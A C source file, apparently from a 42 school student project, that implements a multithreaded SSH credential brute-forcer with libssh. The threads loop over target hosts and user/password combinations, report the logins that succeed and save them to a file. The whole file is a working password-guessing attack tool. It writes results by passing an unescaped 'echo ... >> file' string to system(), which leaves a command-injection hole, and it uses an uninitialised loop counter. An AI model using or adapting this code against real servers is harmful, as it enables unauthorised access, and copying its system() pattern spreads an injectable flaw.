/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_thread.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/03/24 12:48:09 by tnard             #+#    #+#             */
/*   Updated: 2022/03/24 12:59:24 by tnard            ###   ########lyon.fr   */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/px_ssh.h"

void ft_thread(void *content)
{
	char *tmp;
	t_threads *threads = (t_threads *)content;
	unsigned int	x;
	int				rc;
	int				y;
	int				error;

	while (1)
	{
		while (x < threads->nb_hosts)
		{
			if (threads->hosts[x].ip == NULL || threads->hosts[x].port == 0 || threads->hosts[x].status == 1)
			{
				x++;
			}
			else if (threads->hosts[x].status == 0)
			{
				threads->hosts[x].status = 1;
				rc = 0;
				error = 0;
				y = 0;
				while (y < threads->nb_combo && error == 0)
				{
					threads->ssh = ssh_new();
					if (threads->ssh == NULL)
					{
						printf("Error for threads %d, he gonna sleep :(\n", threads->id);
						while (1)
							usleep(100);
					}
					//dprintf(1, "t: %d ip : %s %s %s\n", threads->id,threads->hosts[x].ip, threads->combos[y].user, threads->combos[y].pass);
					ssh_options_set(threads->ssh, SSH_OPTIONS_HOST, threads->hosts[x].ip);
					ssh_options_set(threads->ssh, SSH_OPTIONS_USER, threads->combos[y].user);
					rc = ssh_connect(threads->ssh);
					if (rc != SSH_OK)  
					{
						if (strncmp(ssh_get_error(threads->ssh), "Connection refused", 18) == 0 || strncmp(ssh_get_error(threads->ssh), "Socket error: disconnected", 26) == 0 || strncmp(ssh_get_error(threads->ssh), "Socket error: Connection reset by peer", 38) == 0 || strncmp(ssh_get_error(threads->ssh), "Socket error: disconnected", 26) == 0 || strncmp(ssh_get_error(threads->ssh), "Timeout connecting", 18) == 0 || strncmp(ssh_get_error(threads->ssh), "Received SSH_MSG_DISCONNECT: 2:The connection is closed by SSH", 62) == 0)
						{
							error = 1;
							threads->hosts[x].status = 2;
						}
						else
							dprintf(1, "\nError : %s - %d | %s:%s:%s\n", ssh_get_error(threads->ssh), error, threads->hosts[x].ip, threads->combos[y].user, threads->combos[y].pass);
					}
					else
					{
						rc = ssh_userauth_password(threads->ssh, NULL, threads->combos[y].pass);
						if (rc != SSH_AUTH_SUCCESS)
						{
							//dprintf(1, "\nError : %s - %d\n", ssh_get_error(threads->ssh), error);
						}
						else
						{
							dprintf(1, "\n\n\033[2K\r\033[1;32m[+]\033[0m %s:%s:%s\e[0m\n\n", threads->hosts[x].ip, threads->combos[y].user, threads->combos[y].pass);
							tmp = strdup(threads->hosts[x].ip);
							tmp = ft_strjoin(tmp, ":");
							tmp = ft_strjoin(tmp, threads->combos[y].user);
							tmp = ft_strjoin(tmp, ":");
							tmp = ft_strjoin(tmp, threads->combos[y].pass);
							tmp = ft_strjoin("echo ", tmp);
							tmp = ft_strjoin(tmp, " >> ");
							tmp = ft_strjoin(tmp, threads->output);
							threads->hosts[x].status = 3;
							error = 2;
							system(tmp);
							free(tmp);
							//fprintf(ptr, "%s:%s:%s\n", threads->hosts[x].ip, threads->combos[y].user, threads->combos[y].pass);
						}
					}
					ssh_disconnect(threads->ssh);
					ssh_free(threads->ssh);
					y++;
				}
				if (threads->hosts[x].status != 3)
					threads->hosts[x].status = 2;
				x++;
			}
			usleep(100);
		}
		usleep(100);
	}
}

t_threads *ft_create_thread(int nb_threads, t_hosts *hosts, t_combo *combos, unsigned int nb_hosts, unsigned int nb_combo, char *output)
{
	t_threads *threads;
	int			x;

	threads = malloc(sizeof(t_threads) * nb_threads);
	x = 0;
	while (x < nb_threads)
	{
		threads[x].id = x;
		threads[x].hosts = hosts;
		threads[x].combos = combos;
		threads[x].nb_hosts = nb_hosts;
		threads[x].nb_combo = nb_combo;
		threads[x].output = output;
		dprintf(1, "\033[2K\r\033[2K\r\033[1;32m[+]\033[0m %d/%d threads loaded\e[0m", x + 1, nb_threads);
		if (pthread_create(&threads[x].thread, NULL, (void *)ft_thread, (void *)&threads[x]))
			printf("Error: pthread_create\n");
			
		pthread_detach(threads[x].thread);
		x++;
	}
	printf("\n");
	return (threads);
}